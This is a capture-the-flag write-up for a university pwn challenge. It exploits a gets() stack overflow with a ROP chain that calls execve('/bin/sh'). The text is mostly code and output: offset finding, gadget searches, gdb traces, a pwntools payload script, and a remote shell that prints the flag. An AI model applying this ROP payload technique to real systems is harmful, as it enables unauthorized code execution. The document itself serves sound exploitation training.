Points: 100
Location: `nc offsec-chalbroker.osiris.cyber.nyu.edu 1342`
Download: inspector
Lore: Inspector Gadget
Flag: `flag{inspect0r_gadg3t}`
###### First Run:
```
┌──(kali㉿kali)-[~/Desktop/6-Week]
└─$ ./inspector 
I'm not even pretending this isn't a stack-smash anymore. Please pop a shell!
Hello
```
###### Main Method:
```
undefined8 main(EVP_PKEY_CTX *param_1)
{
  char data [32];
  
  init(param_1);
  puts("I\'m not even pretending this isn\'t a stack-smash anymore. Please pop a shell!");
  gets(data);
  return 0;
}
```
Well, we love `gets`
###### Got some pre-defined gadgets in our functions too, but I'm gonna pretend we don't have them yet
![[Pasted image 20240309160310.png]]

### Other Quick Checks
###### Checksec:
```
┌──(kali㉿kali)-[~/Desktop/6-Week]
└─$ checksec inspector 
[*] '/home/kali/Desktop/6-Week/inspector'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
###### VMMAP
```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/kali/Desktop/6-Week/inspector
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/kali/Desktop/6-Week/inspector
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/kali/Desktop/6-Week/inspector
0x00007ffff7dc8000 0x00007ffff7dcb000 0x0000000000000000 rw- 
0x00007ffff7dcb000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7df1000 0x00007ffff7f46000 0x0000000000026000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f46000 0x00007ffff7f9a000 0x000000000017b000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f9a000 0x00007ffff7f9e000 0x00000000001cf000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f9e000 0x00007ffff7fa0000 0x00000000001d3000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7fa0000 0x00007ffff7fad000 0x0000000000000000 rw- 
0x00007ffff7fc3000 0x00007ffff7fc5000 0x0000000000000000 rw- 
0x00007ffff7fc5000 0x00007ffff7fc9000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc9000 0x00007ffff7fcb000 0x0000000000000000 r-x [vdso]
0x00007ffff7fcb000 0x00007ffff7fcc000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fcc000 0x00007ffff7ff1000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ff1000 0x00007ffff7ffb000 0x0000000000026000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000030000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000032000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
```
So read/writes are at
```
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/kali/Desktop/6-Week/inspector
0x00007ffff7dc8000 0x00007ffff7dcb000 0x0000000000000000 rw- 
0x00007ffff7f9e000 0x00007ffff7fa0000 0x00000000001d3000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7fa0000 0x00007ffff7fad000 0x0000000000000000 rw- 
0x00007ffff7fc3000 0x00007ffff7fc5000 0x0000000000000000 rw- 
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000032000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
```
### Finding Offsets
Fault offset:
```
┌──(kali㉿kali)-[~/Desktop/6-Week]
└─$ python3 Inspector_Pwn.py 
[+] Starting local process './inspector': pid 10570
[*] Process './inspector' stopped with exit code -11 (SIGSEGV) (pid 10570)
[+] Parsing corefile...: Done
[*] '/home/kali/Desktop/6-Week/core.10570'
    Arch:      amd64-64-little
    RIP:       0x400678
    RSP:       0x7ffd0d8eeb38
    Exe:       '/home/kali/Desktop/6-Week/inspector' (0x400000)
    Fault:     0x6161616c6161616b
[*] rsp = 0x7ffd0d8eeb38
[*] offset = 40
```

Registers/Stack Data
```
┌──(kali㉿kali)-[~/Desktop/6-Week]
└─$ gdb ./inspector -q
GEF for linux ready, type `gef' to start, `gef config' to configure
gef➤  r < inp

I'm not even pretending this isn't a stack-smash anymore. Please pop a shell!
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400678 in main ()

$rax   : 0x0               
$rbx   : 0x00007fffffffded8  →  0x00007fffffffe247  →  "/home/kali/Desktop/6-Week/inspector"
$rcx   : 0x00007ffff7f9eaa0  →  0x00000000fbad2098
$rdx   : 0x0               
$rsp   : 0x00007fffffffddc8  →  "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00000000006022a0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$rdi   : 0x00007ffff7fa0a40  →  0x0000000000000000
$rip   : 0x0000000000400678  →  <main+46> ret 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x00007fffffffdee8  →  0x00007fffffffe26b  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000

0x00007fffffffddc8│+0x0000: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"    ← $rsp
0x00007fffffffddd0│+0x0008: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0x00007fffffffddd8│+0x0010: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffdde0│+0x0018: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffdde8│+0x0020: "saaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffddf0│+0x0028: "uaaavaaawaaaxaaayaaa"
0x00007fffffffddf8│+0x0030: "waaaxaaayaaa"
0x00007fffffffde00│+0x0038: 0x0000000061616179 ("yaaa"?)
```

```
stack ────
0x00007fffffffddc8│+0x0000: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"    ← $rsp
0x00007fffffffddd0│+0x0008: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0x00007fffffffddd8│+0x0010: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffdde0│+0x0018: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffdde8│+0x0020: "saaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffddf0│+0x0028: "uaaavaaawaaaxaaayaaa"
0x00007fffffffddf8│+0x0030: "waaaxaaayaaa"
0x00007fffffffde00│+0x0038: 0x0000000061616179 ("yaaa"?)
```
Breaks on `ret` in `main`
```
     0x40066d <main+35>        call   0x4004f0 <gets@plt>
     0x400672 <main+40>        mov    eax, 0x0
     0x400677 <main+45>        leave  
 →   0x400678 <main+46>        ret
```

Register/Stack Offsets:
```
# Fault/Top of Stack
>>> cyclic_find("kaaa")
40

# RBP Overwrite
>>> cyclic_find("iaaa")
32
```

So our payload will need to start like
`[40 bytes of Data] + [Addr]`

# Finding Gadgets:
The gadget functions...I do not see them
###### For reference, here's what's in each gadget
Gadget 1: `40062a`
	`0x0000000000400621 : push rbp ; mov rbp, rsp ; syscall`
Gadget 2: `40062a`
	`0x000000000040062a : push rbp ; mov rbp, rsp ; pop rdi ; ret`
Gadget 3: `400632`
	`0x0000000000400632 : push rbp ; mov rbp, rsp ; pop rsi ; ret`
Gadget 4: `40063a`
	`0x000000000040063a : push rbp ; mov rbp, rsp ; pop rdx ; ret`
Gadget 5: `400642`
	`0x0000000000400642 : push rbp ; mov rbp, rsp ; pop rax ; ret`

##### 128 gadgets according to *ROPgadget*
* I must simplify

Ideal is going to be if we have a `syscall` gadget:
Syscalls:
```
┌──(kali㉿kali)-[~/Desktop/6-Week]
└─$ ROPgadget --binary inspector | grep -i "syscall"
0x0000000000400623 : mov ebp, esp ; syscall
0x0000000000400622 : mov rbp, rsp ; syscall
0x0000000000400621 : push rbp ; mov rbp, rsp ; syscall
0x0000000000400625 : syscall
```

That's cool, so if we're using that `syscall` at `0x400625`, we'll want to use it to call `execve`
1) Put `"/bin/sh"` into `rdi` (the first arg of `execve`)
	1) Find `"/bin/sh"` address
	2) Find gadget to push address onto stack
		1) (wait...I can put things on the stack...I have this power!)
2) Put `0x00` into both `rsi` and `rdx` (The next two args)
	1) Find `mov rsi 0x00` gadget
	2) Find `mov rdx, 0x00` gadget
3) Put `0x3b` in `rax` to tell `system` to call `execve`

Basically want to :
```
mov rdi, <Addr /bin/sh>
mov rsi, 0x00
mov rdx, 0x00
mov rax, 0x3b
syscall
```

#### Put `"/bin/sh"` into `rdi` (the first arg of `execve`)
Basically `mov rdi, <Addr /bin/sh>`
Can see that `inspector` has that data somewhere using *strings*
```
┌──(kali㉿kali)-[~/Desktop/6-Week]
└─$ strings inspector | grep  -i ".bin.sh"
/bin/sh
```
Found `/bin/sh` at `0x00400708` using the [[Ghidra]] search tool
![[Pasted image 20240309171720.png]]
A `useful_string` in memory... how convenient!

##### `push rbp ; mov rbp, rsp ; pop rdi ; ret` at `0x000000000040062a`
```
┌──(kali㉿kali)-[~/Desktop/6-Week]
└─$ ROPgadget --binary inspector | grep -i "rdi"   
0x0000000000400626 : add eax, 0x55c35dc3 ; mov rbp, rsp ; pop rdi ; ret
0x000000000040062c : mov ebp, esp ; pop rdi ; ret
0x000000000040062b : mov rbp, rsp ; pop rdi ; ret
0x000000000040062e : pop rdi ; ret
0x000000000040062a : push rbp ; mov rbp, rsp ; pop rdi ; ret
```
Chose that one because it has built in proper movement of the stack pointers

Address of Command: `40062a`
Address of data: `0x00400708`

#### Put `0x00` into both `rsi` and `rdx` (The next two args)
```
┌──(kali㉿kali)-[~/Desktop/6-Week]
└─$ ROPgadget --binary inspector | grep -i "pop rsi\|pop rdx"   
0x000000000040063c : mov ebp, esp ; pop rdx ; ret
0x0000000000400634 : mov ebp, esp ; pop rsi ; ret
0x000000000040063b : mov rbp, rsp ; pop rdx ; ret
0x0000000000400633 : mov rbp, rsp ; pop rsi ; ret
0x00000000004006e1 : pop rdx ; ret
0x00000000004006e1 : pop rsi ; pop r15 ; ret
0x0000000000400636 : pop rsi ; ret
0x000000000040063a : push rbp ; mov rbp, rsp ; pop rdx ; ret
0x0000000000400632 : push rbp ; mov rbp, rsp ; pop rsi ; ret
```

`0x0000000000400632 : push rbp ; mov rbp, rsp ; pop rsi ; ret`
`0x000000000040063a : push rbp ; mov rbp, rsp ; pop rdx ; ret`

So we'll have
`rsi`
	`CmdAddr`: `0x400632`
	`Data`: `0x00`
`rdx`
	`CmdAddr`: `40063a`
	`Data`: `0x00`

### Put `0x3b` in `rax` to tell `system` to call `execve`
```
┌──(kali㉿kali)-[~/Desktop/6-Week]
└─$ ROPgadget --binary inspector | grep -i "pop rax"         
0x0000000000400644 : mov ebp, esp ; pop rax ; ret
0x0000000000400643 : mov rbp, rsp ; pop rax ; ret
0x0000000000400646 : pop rax ; ret
0x0000000000400642 : push rbp ; mov rbp, rsp ; pop rax ; ret
```

`0x0000000000400642 : push rbp ; mov rbp, rsp ; pop rax ; ret`

So for this:
`CmdAddr`: `400642`
`Data` `0x3b`

### Last, call `syscall`
 `400621
	`0x0000000000400621 : push rbp ; mov rbp, rsp ; syscall`
Don't need to push anything else to the stack I don't think

So now that I have my gadgets and data, how do I build my payload
	(I only have 40 bytes btw)
	And I need to unfuck `rbp`
		Maybe use a `mov rbp, rsp` gadget?

Potential RBP solution:
	Use 
	Then call `4005ea` to restore rbp and then move to rax
		`0x00000000004005ea : mov rbp, rsp ; call rax`
	Or will that just mess everything up? 
		Or maybe I don't have to worry because, while it does get pushed to the stack, it gets overwritten shortly after
			Gonna ignore the problem and come back to it if it becomes an issue

# Payload Building
To build my payload, first I'll want to determine what my stack should look like
### Stack Model
#### Gadgets:
A: `0x000000000040062a`
	`push rbp ; mov rbp, rsp ; pop rdi ; ret`
	Stack Data: `0x00400708`
B: `0x0000000000400632`
	`push rbp ; mov rbp, rsp ; pop rsi ; ret`
	Stack Data: `0x00`
C: `0x000000000040063a`
	`push rbp ; mov rbp, rsp ; pop rdx ; ret`
	Stack Data: `0x00`
D: `0x0000000000400642`
	`push rbp ; mov rbp, rsp ; pop rax ; ret`
	Stack Data: `0x3b`
E: `0x0000000000400621`
	`push rbp ; mov rbp, rsp ; syscall`

Wait, aren't all of these going to push rbp and then just pop THAT value into the register I want
#### Alternative (probably better?) Gadgets:
A: `0x000000000040062e`
	`pop rdi ; ret`
	Stack Data: `0x00400708`
B: `0x0000000000400636`
	`pop rsi ; ret`
	Stack Data: `0x00`
C: `0x000000000040063e`
	`pop rdx ; ret`
	Stack Data: `0x00`
D: `0x0000000000400646`
	`pop rax ; ret`
	Stack Data: `0x3b`
E: `0x0000000000400625`
	`syscall`
F: `0x00000000004004a9`
	`ret`
#### Stack:
```
  retAddr(main) --> 0x40062e    // Addr(A) --> pop rdi ; ret
		 rsp(A) --> 0x400708    // Addr('/bin/sh')
     retAddr(A) --> 0x400636    // Addr(B) --> pop rsi ; ret
		 rsp(B) --> 0x00
     retAddr(B) --> 0x40063e    // Addr(C) --> pop rdx ; ret
		 rsp(C) --> 0x00
     retAddr(C) --> 0x400646    // Addr(D) --> pop rax ; ret
		 rsp(D) --> 0x3b        // execve
     retAddr(D) --> 0x400625    // Addr(E) --> syscall
     retAddr(E) --> 0x4004a9    // Addr(F) --> ret
```

It seems like my biggest issue might be my stack size at the beginning
	Although actually, this all needs to go on the stack in the same place....I bet this is gonna need to go AFTER the 40 bytes of padding

# Test 01
Code:
```python
def buildPld():
	addrA = p64(0x0040062e)
	datA = p64(0x00400708)
	addrB = p64(0x00400636)
	addrC = p64(0x0040063e)
	datBC = p64(0x00)
	addrD = p64(0x00400646)
	datD = p64(0x3b)
	addrE = p64(0x00400625)
	addrF = p64(0x004004a9)
	pad = cyclic(40)

	pld = pad + addrA + datA + addrB + datBC + addrC + datBC + addrD + datD + addrE + addrF
	return pld

def breakGadgets(p):
	addrA = '0x0040062e'
	addrB = '0x00400636'
	addrC = '0x0040063e'
	addrD = '0x00400646'
	addrE = '0x00400625'
	addrF = '0x004004a9'

	gadgetAddrs = [addrA, addrB, addrC, addrD, addrE, addrF]
	for a in gadgetAddrs:
		print("break *" + a)
		p.sendline("break *" + str(a))
		p.recv()

	return 0


def testPld():
	p = process('/bin/bash')
	p.sendline('gdb ./inspector -q')
	p.sendline("break *0x00400678")
	breakGadgets(p)
	p.sendline("r")
	p.recv()
	p.sendline("c")
	#print(p.recv())
	p.recvuntil("shell!")
	p.sendline(buildPld())
	p.interactive()
```

###### We can see our gadget code coming up now that we've gotten to the breakpoint where main returns:
```
Breakpoint 1, 0x0000000000400678 in main ()

registers ────
$rax   : 0x0               
$rbx   : 0x00007fffffffded8  →  0x00007fffffffe248  →  "/home/kali/Desktop/6-Week/inspector"
$rcx   : 0x00007ffff7f9eaa0  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x00007fffffffddc8  →  0x000000000040062e  →  <gadget_2+4> pop rdi
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00000000006022a1  →  0x6361616162616161 ("aaabaaac"?)
$rdi   : 0x00007ffff7fa0a40  →  0x0000000000000000
$rip   : 0x0000000000400678  →  <main+46> ret 

stack ────
0x00007fffffffddc8│+0x0000: 0x000000000040062e  →  <gadget_2+4> pop rdi     ← $rsp
0x00007fffffffddd0│+0x0008: 0x0000000000400708  →  0x0068732f6e69622f ("/bin/sh"?)
0x00007fffffffddd8│+0x0010: 0x0000000000400636  →  <gadget_3+4> pop rsi
0x00007fffffffdde0│+0x0018: 0x0000000000000000
0x00007fffffffdde8│+0x0020: 0x000000000040063e  →  <gadget_4+4> pop rdx
0x00007fffffffddf0│+0x0028: 0x0000000000000000
0x00007fffffffddf8│+0x0030: 0x0000000000400646  →  <gadget_5+4> pop rax
0x00007fffffffde00│+0x0038: 0x000000000000003b (";"?)

 code:x86:64 ────
     0x40066d <main+35>        call   0x4004f0 <gets@plt>
     0x400672 <main+40>        mov    eax, 0x0
     0x400677 <main+45>        leave  
 →   0x400678 <main+46>        ret    
   ↳    0x40062e <gadget_2+4>     pop    rdi
        0x40062f <gadget_2+5>     ret    
        0x400630 <gadget_2+6>     pop    rbp
        0x400631 <gadget_2+7>     ret    
        0x400632 <gadget_3+0>     push   rbp
        0x400633 <gadget_3+1>     mov    rbp, rsp
 threads ────
```


###### Breakpoint 2: Gadget A
```
Breakpoint 2, 0x000000000040062e in gadget_2 ()

registers ────
$rax   : 0x0               
$rbx   : 0x00007fffffffded8  →  0x00007fffffffe248  →  "/home/kali/Desktop/6-Week/inspector"
$rcx   : 0x00007ffff7f9eaa0  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x00007fffffffddd0  →  0x0000000000400708  →  0x0068732f6e69622f ("/bin/sh"?)
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00000000006022a1  →  0x6361616162616161 ("aaabaaac"?)
$rdi   : 0x00007ffff7fa0a40  →  0x0000000000000000
$rip   : 0x000000000040062e  →  <gadget_2+4> pop rdi
$r8    : 0x0000000000602319  →  0x0000000000000000

 stack ────
0x00007fffffffddd0│+0x0000: 0x0000000000400708  →  0x0068732f6e69622f ("/bin/sh"?)     ← $rsp
0x00007fffffffddd8│+0x0008: 0x0000000000400636  →  <gadget_3+4> pop rsi
0x00007fffffffdde0│+0x0010: 0x0000000000000000
0x00007fffffffdde8│+0x0018: 0x000000000040063e  →  <gadget_4+4> pop rdx
0x00007fffffffddf0│+0x0020: 0x0000000000000000
0x00007fffffffddf8│+0x0028: 0x0000000000400646  →  <gadget_5+4> pop rax
0x00007fffffffde00│+0x0030: 0x000000000000003b (";"?)
0x00007fffffffde08│+0x0038: 0x0000000000400625  →  <gadget_1+4> syscall 

code:x86:64 ────
     0x400629 <gadget_1+8>     ret    
     0x40062a <gadget_2+0>     push   rbp
     0x40062b <gadget_2+1>     mov    rbp, rsp
 →   0x40062e <gadget_2+4>     pop    rdi
     0x40062f <gadget_2+5>     ret    
     0x400630 <gadget_2+6>     pop    rbp
     0x400631 <gadget_2+7>     ret    
     0x400632 <gadget_3+0>     push   rbp
     0x400633 <gadget_3+1>     mov    rbp, rsp
```
Stack pointer is pointing to 400708
###### Breakpoint 3; Gadget B
```
Breakpoint 3, 0x0000000000400636 in gadget_3 ()

 registers ────
$rax   : 0x0               
$rbx   : 0x00007fffffffded8  →  0x00007fffffffe248  →  "/home/kali/Desktop/6-Week/inspector"
$rcx   : 0x00007ffff7f9eaa0  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x00007fffffffdde0  →  0x0000000000000000
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00000000006022a1  →  0x6361616162616161 ("aaabaaac"?)
$rdi   : 0x0000000000400708  →  0x0068732f6e69622f ("/bin/sh"?)
$rip   : 0x0000000000400636  →  <gadget_3+4> pop rsi
$r8    : 0x0000000000602319  →  0x0000000000000000
```
We can see that `rdi` is now set to `0x0068732f6e69622f ("/bin/sh"?)`
```
 Registers, Stack, and Operations at Breakpoint

 code:x86:64 ────
     0x400631 <gadget_2+7>     ret    
     0x400632 <gadget_3+0>     push   rbp
     0x400633 <gadget_3+1>     mov    rbp, rsp
 →   0x400636 <gadget_3+4>     pop    rsi
     0x400637 <gadget_3+5>     ret    
     0x400638 <gadget_3+6>     pop    rbp
     0x400639 <gadget_3+7>     ret    
     0x40063a <gadget_4+0>     push   rbp
     0x40063b <gadget_4+1>     mov    rbp, rsp
```
Stack pointer is pointing to 0 to pop off

###### Breakpoint 4: Gadget C
```
Breakpoint 4, 0x000000000040063e in gadget_4 ()

registers ────
$rax   : 0x0               
$rbx   : 0x00007fffffffded8  →  0x00007fffffffe248  →  "/home/kali/Desktop/6-Week/inspector"
$rcx   : 0x00007ffff7f9eaa0  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x00007fffffffddf0  →  0x0000000000000000
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x0               
$rdi   : 0x0000000000400708  →  0x0068732f6e69622f ("/bin/sh"?)
$rip   : 0x000000000040063e  →  <gadget_4+4> pop rdx
$r8    : 0x0000000000602319  →  0x0000000000000000

stack ────
0x00007fffffffddf0│+0x0000: 0x0000000000000000     ← $rsp
0x00007fffffffddf8│+0x0008: 0x0000000000400646  →  <gadget_5+4> pop rax
0x00007fffffffde00│+0x0010: 0x000000000000003b (";"?)
0x00007fffffffde08│+0x0018: 0x0000000000400625  →  <gadget_1+4> syscall 
0x00007fffffffde10│+0x0020: 0x00000000004004a9  →  <_init+25> ret 
0x00007fffffffde18│+0x0028: 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000
0x00007fffffffde20│+0x0030: 0xd5866103fe1c13b9
0x00007fffffffde28│+0x0038: 0xd586714208b813b9

code:x86:64 ────
     0x400639 <gadget_3+7>     ret    
     0x40063a <gadget_4+0>     push   rbp
     0x40063b <gadget_4+1>     mov    rbp, rsp
 →   0x40063e <gadget_4+4>     pop    rdx
     0x40063f <gadget_4+5>     ret    
     0x400640 <gadget_4+6>     pop    rbp
     0x400641 <gadget_4+7>     ret    
     0x400642 <gadget_5+0>     push   rbp
     0x400643 <gadget_5+1>     mov    rbp, rsp
```
And we can see that now `rsi` is set to 0
Stack pointer is pointing to 0 to pop off

###### Breakpoint 5: Gadget D
```
Breakpoint 5, 0x0000000000400646 in gadget_5 ()
registers ────
$rax   : 0x0               
$rbx   : 0x00007fffffffded8  →  0x00007fffffffe248  →  "/home/kali/Desktop/6-Week/inspector"
$rcx   : 0x00007ffff7f9eaa0  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x00007fffffffde00  →  0x000000000000003b (";"?)
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x0               
$rdi   : 0x0000000000400708  →  0x0068732f6e69622f ("/bin/sh"?)
$rip   : 0x0000000000400646  →  <gadget_5+4> pop rax
$r8    : 0x0000000000602319  →  0x0000000000000000

stack ────
0x00007fffffffde00│+0x0000: 0x000000000000003b (";"?)     ← $rsp
0x00007fffffffde08│+0x0008: 0x0000000000400625  →  <gadget_1+4> syscall 
0x00007fffffffde10│+0x0010: 0x00000000004004a9  →  <_init+25> ret 
0x00007fffffffde18│+0x0018: 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000

code:x86:64 ────
     0x400641 <gadget_4+7>     ret    
     0x400642 <gadget_5+0>     push   rbp
     0x400643 <gadget_5+1>     mov    rbp, rsp
 →   0x400646 <gadget_5+4>     pop    rax
     0x400647 <gadget_5+5>     ret    
     0x400648 <gadget_5+6>     pop    rbp
     0x400649 <gadget_5+7>     ret    
     0x40064a <main+0>         push   rbp
     0x40064b <main+1>         mov    rbp, rsp
```
Rsp points to `0x3b`
RDX is now 0
###### Breakpoint 6
```
Breakpoint 6, 0x0000000000400625 in gadget_1 ()

registers ────
$rax   : 0x3b              
$rbx   : 0x00007fffffffded8  →  0x00007fffffffe248  →  "/home/kali/Desktop/6-Week/inspector"
$rcx   : 0x00007ffff7f9eaa0  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x00007fffffffde10  →  0x00000000004004a9  →  <_init+25> ret 
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x0               
$rdi   : 0x0000000000400708  →  0x0068732f6e69622f ("/bin/sh"?)
$rip   : 0x0000000000400625  →  <gadget_1+4> syscall 
$r8    : 0x0000000000602319  →  0x0000000000000000

stack ────
0x00007fffffffde10│+0x0000: 0x00000000004004a9  →  <_init+25> ret      ← $rsp
0x00007fffffffde18│+0x0008: 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000
0x00007fffffffde20│+0x0010: 0xd5866103fe1c13b9
0x00007fffffffde28│+0x0018: 0xd586714208b813b9

code:x86:64 ────
     0x400620 <init+35>        ret    
     0x400621 <gadget_1+0>     push   rbp
     0x400622 <gadget_1+1>     mov    rbp, rsp
 →   0x400625 <gadget_1+4>     syscall 
     0x400627 <gadget_1+6>     ret    
     0x400628 <gadget_1+7>     pop    rbp
     0x400629 <gadget_1+8>     ret    
     0x40062a <gadget_2+0>     push   rbp
     0x40062b <gadget_2+1>     mov    rbp, rsp
```
OUR SYSCALL IS NEXT
All of our registers have their data
LET'S GOOOOO

.....did this ACTUALLY WORK?!?!?!?!?!?
```
gef➤  $ c
Continuing.
process 178693 is executing new program: /usr/bin/dash
```

# Local Exploitation?
```
┌──(kali㉿kali)-[~/Desktop/6-Week]
└─$ python3 Inspector_Pwn.py
[+] Starting local process './inspector': pid 186651
/home/kali/Desktop/6-Week/Inspector_Pwn.py:86: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("shell!")
[*] Switching to interactive mode

$ whoami
kali
$ pwd
/home/kali/Desktop/6-Week
```

Did this really work? Like....really?!?!?

# I guess I am just incredible:
```
┌──(kali㉿kali)-[~/Desktop/6-Week]
└─$ python3 Inspector_Pwn.py
[*] Switching to interactive mode

$ whoami
pwn
$ pwd
/home/pwn
$ ls
flag.txt
inspector
$ cat flag.txt
flag{inspect0r_gadg3t}
```

